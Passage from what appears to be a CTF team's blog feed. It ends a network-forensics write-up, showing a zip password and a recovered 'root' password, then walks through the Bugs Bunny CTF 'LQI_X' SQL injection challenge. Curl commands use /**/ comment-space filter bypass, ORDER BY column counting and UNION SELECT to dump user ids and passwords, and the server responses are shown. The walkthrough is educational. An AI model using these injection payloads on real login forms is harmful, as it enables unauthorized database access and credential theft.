<p>The password is Pyj4m4P4rtY@2017 for the zip file!</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line"></div><div class="line">kinyabitch@Debian ~/D/H/c/sha2017&gt; unzip secret.zip </div><div class="line">Archive:  secret.zip</div><div class="line">[secret.zip] secret.txt password: </div><div class="line">  inflating: secret.txt              </div><div class="line">  inflating: hamburger_pussy.jpg</div><div class="line">kinyabitch@Debian ~/D/H/c/sha2017&gt; cat secret.txt </div><div class="line">Important passwords:</div><div class="line">secret.zip  Pyj4m4P4rtY@2017</div><div class="line">root    Welcome123</div><div class="line">flag          flag&#123;bf107b7f64f320034df7e48669439f69&#125;</div></pre></td></tr></table></figure>
<p>Finally the flag was flag{bf107b7f64f320034df7e48669439f69}</p>
]]></content>
    
    <summary type="html">
    
      &lt;blockquote&gt;&lt;br&gt;&lt;br&gt;Abuse Mail (300) - 62 solves&lt;br&gt;Our abuse desk received an mail that someone from our network has hacked their company. 
    
    </summary>
    
      <category term="Network" scheme="https://teamrocketist.github.io/categories/Network/"/>
    
    
      <category term="pcap" scheme="https://teamrocketist.github.io/tags/pcap/"/>
    
      <category term="wireshark" scheme="https://teamrocketist.github.io/tags/wireshark/"/>
    
      <category term="usb" scheme="https://teamrocketist.github.io/tags/usb/"/>
    
      <category term="network" scheme="https://teamrocketist.github.io/tags/network/"/>
    
  </entry>
  
  <entry>
    <title>[Web] Bugs Bunny CTF - LQI_X 140</title>
    <link href="https://teamrocketist.github.io/2017/08/02/Web-Bugs-Bunny-CTF-LQI-X-140/"/>
    <id>https://teamrocketist.github.io/2017/08/02/Web-Bugs-Bunny-CTF-LQI-X-140/</id>
    <published>2017-08-02T10:29:58.000Z</published>
    <updated>2017-08-10T02:57:43.109Z</updated>
    
    <content type="html"><![CDATA[<blockquote><br>LQI_X<br>140<br><br>Its for your , login and get all you need<br><br>task : <a href="http://34.253.165.46/LQI_X/" target="_blank" rel="external">http://34.253.165.46/LQI_X/</a><br><br>Author: TnMch<br></blockquote>

<p>We have login form so lets start by doing some tests with curl at the GET parameter username:</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div></pre></td><td class="code"><pre><div class="line"></div><div class="line">(.ctfs) kinyabitch@Debian ~/D/H/ctf&gt; curl -L "http://34.253.165.46/LQI_X/?username=test'&amp;password=" -v</div><div class="line">*   Trying 34.253.165.46...</div><div class="line">* TCP_NODELAY set</div><div class="line">* Connected to 34.253.165.46 (34.253.165.46) port 80 (#0)</div><div class="line">&gt; GET /LQI_X/?username=test'&amp;password= HTTP/1.1</div><div class="line">&gt; Host: 34.253.165.46</div><div class="line">&gt; User-Agent: curl/7.52.1</div><div class="line">&gt; Accept: */*</div><div class="line">&gt; </div><div class="line"><span class="tag">&lt; <span class="attr">HTTP</span>/<span class="attr">1.1</span> <span class="attr">200</span> <span class="attr">OK</span></span></div><div class="line">&lt; Date: Wed, 02 Aug 2017 10:27:30 GMT</div><div class="line"><span class="tag">&lt; <span class="attr">Server:</span> <span class="attr">Apache</span>/<span class="attr">2.4.18</span> (<span class="attr">Ubuntu</span>)</span></div><div class="line">&lt; Vary: Accept-Encoding</div><div class="line"><span class="tag">&lt; <span class="attr">Content-Length:</span> <span class="attr">749</span></span></div><div class="line">&lt; Content-Type: text/html; charset=UTF-8</div><div class="line"><span class="tag">&lt; </span></div><div class="line"><span class="tag"></span></div><div class="line"><span class="tag"></span></div><div class="line">&lt;!DOCTYPE html&gt;</div><div class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></div><div class="line"></div><div class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></div><div class="line"></div><div class="line">  <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">"UTF-8"</span>&gt;</span></div><div class="line"></div><div class="line">  <span class="tag">&lt;<span class="name">title</span>&gt;</span>SQLI-F - Log-in<span class="tag">&lt;/<span class="name">title</span>&gt;</span></div><div class="line"></div><div class="line">  <span class="tag">&lt;<span class="name">link</span> <span class="attr">rel</span>=<span class="string">'stylesheet'</span> <span class="attr">href</span>=<span class="string">'http://codepen.io/assets/libs/fullpage/jquery-ui.css'</span>&gt;</span></div><div class="line"></div><div class="line">    <span class="tag">&lt;<span class="name">link</span> <span class="attr">rel</span>=<span class="string">"stylesheet"</span> <span class="attr">href</span>=<span class="string">"css/style.css"</span> <span class="attr">media</span>=<span class="string">"screen"</span> <span class="attr">type</span>=<span class="string">"text/css"</span> /&gt;</span></div><div class="line"></div><div class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></div><div class="line"></div><div class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></div><div class="line"></div><div class="line">  <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"login-card"</span>&gt;</span></div><div class="line">    <span class="tag">&lt;<span class="name">h1</span>&gt;</span>Log-in<span class="tag">&lt;/<span class="name">h1</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span></div><div class="line">  <span class="tag">&lt;<span class="name">form</span> <span class="attr">method</span>=<span class="string">"GET"</span> <span class="attr">action</span>=<span class="string">""</span>&gt;</span></div><div class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"text"</span> <span class="attr">name</span>=<span class="string">"username"</span> <span class="attr">placeholder</span>=<span class="string">"Username"</span>&gt;</span></div><div class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"password"</span> <span class="attr">name</span>=<span class="string">"password"</span> <span class="attr">placeholder</span>=<span class="string">"Password"</span>&gt;</span></div><div class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"submit"</span> <span class="attr">name</span>=<span class="string">"login"</span> <span class="attr">class</span>=<span class="string">"login login-submit"</span> <span class="attr">value</span>=<span class="string">"login"</span>&gt;</span></div><div class="line">  <span class="tag">&lt;/<span class="name">form</span>&gt;</span></div><div class="line"></div><div class="line">  <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"login-help"</span>&gt;</span></div><div class="line">    <span class="tag">&lt;<span class="name">p</span>&gt;</span> <span class="tag">&lt;/<span class="name">p</span>&gt;</span></div><div class="line">  <span class="tag">&lt;/<span class="name">div</span>&gt;</span></div><div class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></div><div class="line"></div><div class="line">  <span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">'http://codepen.io/assets/libs/fullpage/jquery_and_jqueryui.js'</span>&gt;</span><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></div><div class="line"></div><div class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></div><div class="line"></div><div class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></div></pre></td></tr></table></figure>
<p>Nothing seems to be Changing lets try with password:</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div></pre></td><td class="code"><pre><div class="line"></div><div class="line">curl -L "http://34.253.165.46/LQI_X/?username=test&amp;password=test'%20or%201=1--" -v</div><div class="line">*   Trying 34.253.165.46...</div><div class="line">* TCP_NODELAY set</div><div class="line">* Connected to 34.253.165.46 (34.253.165.46) port 80 (#0)</div><div class="line">&gt; GET /LQI_X/?username=test&amp;password=test'%20or%201=1-- HTTP/1.1</div><div class="line">&gt; Host: 34.253.165.46</div><div class="line">&gt; User-Agent: curl/7.52.1</div><div class="line">&gt; Accept: */*</div><div class="line">&gt; </div><div class="line"><span class="tag">&lt; <span class="attr">HTTP</span>/<span class="attr">1.1</span> <span class="attr">200</span> <span class="attr">OK</span></span></div><div class="line">&lt; Date: Wed, 02 Aug 2017 10:32:28 GMT</div><div class="line"><span class="tag">&lt; <span class="attr">Server:</span> <span class="attr">Apache</span>/<span class="attr">2.4.18</span> (<span class="attr">Ubuntu</span>)</span></div><div class="line">&lt; Content-Length: 12</div><div class="line"><span class="tag">&lt; <span class="attr">Content-Type:</span> <span class="attr">text</span>/<span class="attr">html</span>; <span class="attr">charset</span>=<span class="string">UTF-8</span></span></div><div class="line">&lt; </div><div class="line">* Curl_http_done: called premature == 0</div><div class="line">* Connection #0 to host 34.253.165.46 left intact</div><div class="line">No way SOrry</div></pre></td></tr></table></figure>
<p>Wow a custom error message? they must be filtering some characters or even words… Maybe its the spaces, lets try to use the comment technique to bypass space filtering:</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div></pre></td><td class="code"><pre><div class="line"></div><div class="line">curl "http://34.253.165.46/LQI_X/?username=test&amp;password=test'/**/or/**/1=1--" -v</div><div class="line">*   Trying 34.253.165.46...</div><div class="line">* TCP_NODELAY set</div><div class="line">* Connected to 34.253.165.46 (34.253.165.46) port 80 (#0)</div><div class="line">&gt; GET /LQI_X/?username=test&amp;password=test'/**/or/**/1=1-- HTTP/1.1</div><div class="line">&gt; Host: 34.253.165.46</div><div class="line">&gt; User-Agent: curl/7.52.1</div><div class="line">&gt; Accept: */*</div><div class="line">&gt; </div><div class="line"><span class="tag">&lt; <span class="attr">HTTP</span>/<span class="attr">1.1</span> <span class="attr">200</span> <span class="attr">OK</span></span></div><div class="line">&lt; Date: Wed, 02 Aug 2017 10:37:24 GMT</div><div class="line"><span class="tag">&lt; <span class="attr">Server:</span> <span class="attr">Apache</span>/<span class="attr">2.4.18</span> (<span class="attr">Ubuntu</span>)</span></div><div class="line">&lt; Vary: Accept-Encoding</div><div class="line"><span class="tag">&lt; <span class="attr">Content-Length:</span> <span class="attr">753</span></span></div><div class="line">&lt; Content-Type: text/html; charset=UTF-8</div><div class="line"><span class="tag">&lt; </span></div><div class="line"><span class="tag"></span></div><div class="line"><span class="tag"></span></div><div class="line">&lt;!DOCTYPE html&gt;</div><div class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></div><div class="line"></div><div class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></div><div class="line"></div><div class="line">  <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">"UTF-8"</span>&gt;</span></div><div class="line"></div><div class="line">  <span class="tag">&lt;<span class="name">title</span>&gt;</span>SQLI-F - Log-in<span class="tag">&lt;/<span class="name">title</span>&gt;</span></div><div class="line"></div><div class="line">  <span class="tag">&lt;<span class="name">link</span> <span class="attr">rel</span>=<span class="string">'stylesheet'</span> <span class="attr">href</span>=<span class="string">'http://codepen.io/assets/libs/fullpage/jquery-ui.css'</span>&gt;</span></div><div class="line"></div><div class="line">    <span class="tag">&lt;<span class="name">link</span> <span class="attr">rel</span>=<span class="string">"stylesheet"</span> <span class="attr">href</span>=<span class="string">"css/style.css"</span> <span class="attr">media</span>=<span class="string">"screen"</span> <span class="attr">type</span>=<span class="string">"text/css"</span> /&gt;</span></div><div class="line"></div><div class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></div><div class="line"></div><div class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></div><div class="line"></div><div class="line">  <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"login-card"</span>&gt;</span></div><div class="line">    <span class="tag">&lt;<span class="name">h1</span>&gt;</span>Log-in<span class="tag">&lt;/<span class="name">h1</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span></div><div class="line">  <span class="tag">&lt;<span class="name">form</span> <span class="attr">method</span>=<span class="string">"GET"</span> <span class="attr">action</span>=<span class="string">""</span>&gt;</span></div><div class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"text"</span> <span class="attr">name</span>=<span class="string">"username"</span> <span class="attr">placeholder</span>=<span class="string">"Username"</span>&gt;</span></div><div class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"password"</span> <span class="attr">name</span>=<span class="string">"password"</span> <span class="attr">placeholder</span>=<span class="string">"Password"</span>&gt;</span></div><div class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"submit"</span> <span class="attr">name</span>=<span class="string">"login"</span> <span class="attr">class</span>=<span class="string">"login login-submit"</span> <span class="attr">value</span>=<span class="string">"login"</span>&gt;</span></div><div class="line">  <span class="tag">&lt;/<span class="name">form</span>&gt;</span></div><div class="line"></div><div class="line">  <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"login-help"</span>&gt;</span></div><div class="line">    <span class="tag">&lt;<span class="name">p</span>&gt;</span> test<span class="tag">&lt;/<span class="name">p</span>&gt;</span></div><div class="line">  <span class="tag">&lt;/<span class="name">div</span>&gt;</span></div><div class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></div><div class="line"></div><div class="line">  <span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">'http://codepen.io/assets/libs/fullpage/jquery_and_jqueryui.js'</span>&gt;</span><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></div><div class="line"></div><div class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></div><div class="line"></div><div class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></div></pre></td></tr></table></figure>
<p>It works! now lets use <b>order by</b> to see how many values are returned to know how many columns we will use on our union query injection. Using CURL with <b>I</b> option to check the status code from the request so if the query returns an error we will get a 500 (Internal Error) if not we get a 200 (OK)</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line"></div><div class="line">(.ctfs) kinyabitch@Debian ~/D/H/ctf&gt; curl -I "http://34.253.165.46/LQI_X/?username=test&amp;password=test'/**/order/**/by/**/1--"</div><div class="line">HTTP/1.1 200 OK</div><div class="line">Date: Wed, 02 Aug 2017 10:43:01 GMT</div><div class="line">Server: Apache/2.4.18 (Ubuntu)</div><div class="line">Content-Type: text/html; charset=UTF-8</div><div class="line"></div><div class="line">(.ctfs) kinyabitch@Debian ~/D/H/ctf&gt; curl -I "http://34.253.165.46/LQI_X/?username=test&amp;password=test'/**/order/**/by/**/2--"</div><div class="line">HTTP/1.0 500 Internal Server Error</div><div class="line">Date: Wed, 02 Aug 2017 10:43:03 GMT</div><div class="line">Server: Apache/2.4.18 (Ubuntu)</div><div class="line">Connection: close</div><div class="line">Content-Type: text/html; charset=UTF-8</div></pre></td></tr></table></figure>
<p>As we can see the sql query is only selecting one column the real query must be something similar to this “Select username from table_users where username=%s and password=%s”. Now injecting with union:</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div></pre></td><td class="code"><pre><div class="line"></div><div class="line"> curl "http://34.253.165.46/LQI_X/?username=test&amp;password=test'/**/union/**/select/**/1--"</div><div class="line"></div><div class="line"></div><div class="line"><span class="meta">&lt;!DOCTYPE html&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></div><div class="line"></div><div class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></div><div class="line"></div><div class="line">  <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">"UTF-8"</span>&gt;</span></div><div class="line"></div><div class="line">  <span class="tag">&lt;<span class="name">title</span>&gt;</span>SQLI-F - Log-in<span class="tag">&lt;/<span class="name">title</span>&gt;</span></div><div class="line"></div><div class="line">  <span class="tag">&lt;<span class="name">link</span> <span class="attr">rel</span>=<span class="string">'stylesheet'</span> <span class="attr">href</span>=<span class="string">'http://codepen.io/assets/libs/fullpage/jquery-ui.css'</span>&gt;</span></div><div class="line"></div><div class="line">    <span class="tag">&lt;<span class="name">link</span> <span class="attr">rel</span>=<span class="string">"stylesheet"</span> <span class="attr">href</span>=<span class="string">"css/style.css"</span> <span class="attr">media</span>=<span class="string">"screen"</span> <span class="attr">type</span>=<span class="string">"text/css"</span> /&gt;</span></div><div class="line"></div><div class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></div><div class="line"></div><div class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></div><div class="line"></div><div class="line">  <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"login-card"</span>&gt;</span></div><div class="line">    <span class="tag">&lt;<span class="name">h1</span>&gt;</span>Log-in<span class="tag">&lt;/<span class="name">h1</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span></div><div class="line">  <span class="tag">&lt;<span class="name">form</span> <span class="attr">method</span>=<span class="string">"GET"</span> <span class="attr">action</span>=<span class="string">""</span>&gt;</span></div><div class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"text"</span> <span class="attr">name</span>=<span class="string">"username"</span> <span class="attr">placeholder</span>=<span class="string">"Username"</span>&gt;</span></div><div class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"password"</span> <span class="attr">name</span>=<span class="string">"password"</span> <span class="attr">placeholder</span>=<span class="string">"Password"</span>&gt;</span></div><div class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"submit"</span> <span class="attr">name</span>=<span class="string">"login"</span> <span class="attr">class</span>=<span class="string">"login login-submit"</span> <span class="attr">value</span>=<span class="string">"login"</span>&gt;</span></div><div class="line">  <span class="tag">&lt;/<span class="name">form</span>&gt;</span></div><div class="line"></div><div class="line">  <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"login-help"</span>&gt;</span></div><div class="line">    <span class="tag">&lt;<span class="name">p</span>&gt;</span> 1<span class="tag">&lt;/<span class="name">p</span>&gt;</span></div><div class="line">  <span class="tag">&lt;/<span class="name">div</span>&gt;</span></div><div class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></div><div class="line"></div><div class="line">  <span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">'http://codepen.io/assets/libs/fullpage/jquery_and_jqueryui.js'</span>&gt;</span><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></div><div class="line"></div><div class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></div><div class="line"></div><div class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></div></pre></td></tr></table></figure>
<p>It worked! as you can see at the image above the number “1” showed up now what I tryed after this was getting the table names from information_schema but somehow I wasn’t able to do it so I tried to guess the obvious names, assumed that the table name is users and the columns probably id,username and password.</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div></pre></td><td class="code"><pre><div class="line"></div><div class="line">curl "http://34.253.165.46/LQI_X/?username=test&amp;password=test'/**/union/**/select</div><div class="line">&gt; GET /LQI_X/?username=test&amp;password=test'/**/union/**/select/**/id/**/from/**/users/**/limit/**/0,1-- HTTP/1.1</div><div class="line">... </div><div class="line">  <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"login-help"</span>&gt;</span></div><div class="line">    <span class="tag">&lt;<span class="name">p</span>&gt;</span> 1<span class="tag">&lt;/<span class="name">p</span>&gt;</span></div><div class="line">  <span class="tag">&lt;/<span class="name">div</span>&gt;</span></div><div class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></div><div class="line">...</div><div class="line">curl -v "http://34.253.165.46/LQI_X/?username=test&amp;password=test'/**/union/**/select/**/id/**/from/**/users/**/limit/**/1,1--"</div><div class="line">&gt; GET /LQI_X/?username=test&amp;password=test'/**/union/**/select/**/id/**/from/**/users/**/limit/**/1,1-- HTTP/1.1</div><div class="line">... </div><div class="line">  <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"login-help"</span>&gt;</span></div><div class="line">    <span class="tag">&lt;<span class="name">p</span>&gt;</span> 2<span class="tag">&lt;/<span class="name">p</span>&gt;</span></div><div class="line">  <span class="tag">&lt;/<span class="name">div</span>&gt;</span></div><div class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></div><div class="line">...</div><div class="line">curl -v "http://34.253.165.46/LQI_X/?username=test&amp;password=test'/**/union/**/select/**/id/**/from/**/users/**/limit/**/2,1--"</div><div class="line">* Connected to 34.253.165.46 (34.253.165.46) port 80 (#0)</div><div class="line">&gt; GET /LQI_X/?username=test&amp;password=test'/**/union/**/select/**/id/**/from/**/users/**/limit/**/2,1-- HTTP/1.1</div><div class="line">... </div><div class="line">  <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"login-help"</span>&gt;</span></div><div class="line">    <span class="tag">&lt;<span class="name">p</span>&gt;</span> 3<span class="tag">&lt;/<span class="name">p</span>&gt;</span></div><div class="line">  <span class="tag">&lt;/<span class="name">div</span>&gt;</span></div><div class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></div><div class="line">...</div><div class="line">curl -v "http://34.253.165.46/LQI_X/?username=test&amp;password=test'/**/union/**/select/**/id/**/from/**/users/**/limit/**/3,1--"</div><div class="line">&gt; GET /LQI_X/?username=test&amp;password=test'/**/union/**/select/**/id/**/from/**/users/**/limit/**/3,1-- HTTP/1.1</div><div class="line">... </div><div class="line">  <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"login-help"</span>&gt;</span></div><div class="line">    <span class="tag">&lt;<span class="name">p</span>&gt;</span> 4<span class="tag">&lt;/<span class="name">p</span>&gt;</span></div><div class="line">  <span class="tag">&lt;/<span class="name">div</span>&gt;</span></div><div class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></div><div class="line">...</div><div class="line">curl -v "http://34.253.165.46/LQI_X/?username=test&amp;password=test'/**/union/**/select/**/id/**/from/**/users/**/limit/**/4,1--"</div><div class="line">&gt; GET /LQI_X/?username=test&amp;password=test'/**/union/**/select/**/id/**/from/**/users/**/limit/**/4,1-- HTTP/1.1</div><div class="line">... </div><div class="line">  <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"login-help"</span>&gt;</span></div><div class="line">    <span class="tag">&lt;<span class="name">p</span>&gt;</span> 5<span class="tag">&lt;/<span class="name">p</span>&gt;</span></div><div class="line">  <span class="tag">&lt;/<span class="name">div</span>&gt;</span></div><div class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></div><div class="line">...</div></pre></td></tr></table></figure>
<p>As we can see we were successful to leak the ids from the users now lets try with the password</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div></pre></td><td class="code"><pre><div class="line"></div><div class="line">(.ctfs) kinyabitch@Debian ~/D/H/ctf&gt; curl -v "http://34.253.165.46/LQI_X/?username=test&amp;password=test'/**/union/**/select/**/password/**/from/**/users/**/limit/**/0,1--"</div><div class="line">....</div><div class="line">  <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"login-help"</span>&gt;</span></div><div class="line">    <span class="tag">&lt;<span class="name">p</span>&gt;</span> _Easy_I_Dont_Think<span class="tag">&lt;/<span class="name">p</span>&gt;</span></div><div class="line">  <span class="tag">&lt;/<span class="name">div</span>&gt;</span></div><div class="line">....</div><div class="line">(.ctfs) kinyabitch@Debian ~/D/H/ctf&gt; curl -v "http://34.253.165.46/LQI_X/?username=test&amp;password=test'/**/union/**/select/**/password/**/from/**/users/**/limit/**/1,1--"</div><div class="line">....</div><div class="line">  <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"login-help"</span>&gt;</span></div><div class="line">    <span class="tag">&lt;<span class="name">p</span>&gt;</span> hello<span class="tag">&lt;/<span class="name">p</span>&gt;</span></div><div class="line">  <span class="tag">&lt;/<span class="name">div</span>&gt;</span></div><div class="line">....</div><div class="line">(.ctfs) kinyabitch@Debian ~/D/H/ctf&gt; curl -v "http://34.253.165.46/LQI_X/?username=test&amp;password=test'/**/union/**/select/**/password/**/from/**/users/**/limit/**/2,1--"</div><div class="line">....</div><div class="line">  <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"login-help"</span>&gt;</span></div><div class="line">    <span class="tag">&lt;<span class="name">p</span>&gt;</span> here<span class="tag">&lt;/<span class="name">p</span>&gt;</span></div><div class="line">  <span class="tag">&lt;/<span class="name">div</span>&gt;</span></div><div class="line">....</div><div class="line">(.ctfs) kinyabitch@Debian ~/D/H/ctf&gt; curl -v "http://34.253.165.46/LQI_X/?username=test&amp;password=test'/**/union/**/select/**/password/**/from/**/users/**/limit/**/3,1--"</div><div class="line">....</div><div class="line">  <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"login-help"</span>&gt;</span></div><div class="line">    <span class="tag">&lt;<span class="name">p</span>&gt;</span> test<span class="tag">&lt;/<span class="name">p</span>&gt;</span></div><div class="line">  <span class="tag">&lt;/<span class="name">div</span>&gt;</span></div><div class="line">....</div><div class="line">(.ctfs) kinyabitch@Debian ~/D/H/ctf&gt; curl -v "http://34.253.165.46/LQI_X/?username=test&amp;password=test'/**/union/**/select/**/password/**/from/**/users/**/limit/**/4,1--"</div><div class="line">....</div><div class="line">  <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"login-help"</span>&gt;</span></div><div class="line">    <span class="tag">&lt;<span class="name">p</span>&gt;</span> &#125;<span class="tag">&lt;/<span class="name">p</span>&gt;</span></div><div class="line">  <span class="tag">&lt;/<span 